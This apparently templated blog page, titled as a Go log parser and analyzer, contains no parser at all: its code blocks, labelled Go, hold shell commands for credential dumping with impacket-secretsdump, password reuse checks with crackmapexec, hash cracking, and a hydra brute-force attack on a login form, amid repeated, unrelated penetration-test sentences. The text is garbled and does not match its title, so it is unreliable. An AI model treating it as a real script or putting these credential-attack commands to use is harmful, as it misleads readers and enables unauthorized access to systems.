---
TitleSEO: "Log Parser and Analyzer in Go | ZureFX"
TitlePost: "Log Parser and Analyzer — Go"
Author: "ZureFX"
Description: "A Go script for log parser and analyzer. Built for security research and automation."
Keywords: "automation, go, parser"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-191.html"
URL_IMAGES: ""
Date: "2024-12-13"
Tags: "Automation, Go, Parser"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-191"
Permalink: "/scripting/script-log-parser-and-analyzer-191.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `secretsdump`
- `atexec`
- `socat`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

```go
nmap -sCV -p139,139,25 10.88.81.31 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.16.138.149
crackmapexec smb 10.66.127.194 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

```go
gobuster dir -u http://10.57.248.242/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

```bash
crackmapexec smb 10.82.183.186 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.53.192.206 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

```bash
nmap -sCV -p1521,25,5432 10.28.32.145 -oN scan.txt
nmap -sCV -p1521,9200,587 10.91.142.83 -oN scan.txt
```

## Output

### Example Output

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```
[+] Scanning target...
[+] Found 3 results
[+] Done in 17.51s
```
